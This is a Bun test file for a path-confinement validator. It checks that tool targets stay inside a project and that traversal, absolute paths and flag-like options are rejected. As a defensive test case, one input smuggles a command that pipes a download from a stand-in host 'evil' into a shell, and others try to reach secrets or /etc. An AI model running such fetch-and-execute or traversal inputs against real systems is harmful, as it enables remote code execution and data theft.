import { describe, expect, test } from "bun:test";
import { confinedTargets } from "../lib/targets.ts";

const project = process.platform === "win32" ? "C:\\work\\repo" : "/work/repo";

describe("confinedTargets", () => {
  test("keeps relative paths inside the project", () => {
    expect(confinedTargets(project, ["src", "tests/test_a.py"])).toEqual(["src", "tests/test_a.py"]);
  });

  test("normalizes a dotted prefix and the project root", () => {
    expect(confinedTargets(project, ["./src", "."])).toEqual(["src", "."]);
  });

  test("rejects an option that would be parsed as a tool flag", () => {
    expect(() => confinedTargets(project, ["--coverage-command"])).toThrow(/options/);
    expect(() => confinedTargets(project, ["--test-command=curl evil|sh"])).toThrow(/options/);
  });

  test("rejects a path that escapes the project", () => {
    expect(() => confinedTargets(project, ["../secrets"])).toThrow(/outside/);
    expect(() => confinedTargets(project, ["src/../../secrets"])).toThrow(/outside/);
  });

  test("rejects an absolute path outside the project", () => {
    const outside = process.platform === "win32" ? "C:\\Windows\\System32" : "/etc";
    expect(() => confinedTargets(project, [outside])).toThrow(/outside/);
  });
});
